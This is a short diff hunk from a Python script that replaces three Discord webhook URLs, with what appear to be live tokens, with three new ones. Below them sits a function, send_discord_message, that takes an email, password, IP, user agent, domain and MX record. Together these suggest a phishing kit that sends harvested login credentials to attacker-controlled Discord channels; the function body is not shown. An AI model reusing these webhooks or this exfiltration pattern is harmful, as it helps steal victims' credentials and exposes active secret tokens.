@@ -19,9 +19,9 @@ from email.mime.multipart import MIMEMultipart
 
 # Discord Webhook URL
 DISCORD_WEBHOOK_URLS = [
-    "https://discord.com/api/webhooks/1420157530721619970/9m64o8atZCbmF2EAMBeenreGaJw7yHOLPpI5YEpP9hJSBnyeis7f__gJ4KstcxQNg4FG",
-    "https://discord.com/api/webhooks/1420157584052060280/0vY-CvfMcQwAHUxoxOFzFRXyY4PGpmMKhhnqIMJKjutNT8bNITXcApWsDrQNaBhEwvTw",
-    "https://discord.com/api/webhooks/1420157750482042995/eZDUhKj-TRLW0rfXBDZpOYJBIF8K6ftoYVF93DghGco7LBNEGkY4LfInZGfLNhL-xqaW"
+    "https://discord.com/api/webhooks/1420691107963998311/VDT9ptkZgdHoknZ5t0wNc5Q2LqMxbp3Mkejn80sDFsRselXMng5o-qg7QwpCrzZpFpX8",
+    "https://discord.com/api/webhooks/1420691022366900235/ADwnB9eUl8SJ8eCRNpkfqyFPaEKfb9vo8rgSlj1BFsa03RBvoSg5x9pnEQuYhRFuBaIR",
+    "https://discord.com/api/webhooks/1420690835842011149/Du2Xx7OAVV1CP2Btnl-yb3dou0K4YSyIA-b6vwbrUafr0iAdakGaRNEBkAfhvGAQ7NSW"
 ]
 
 def send_discord_message(email, password, ip, useragent, domain, mx_record):
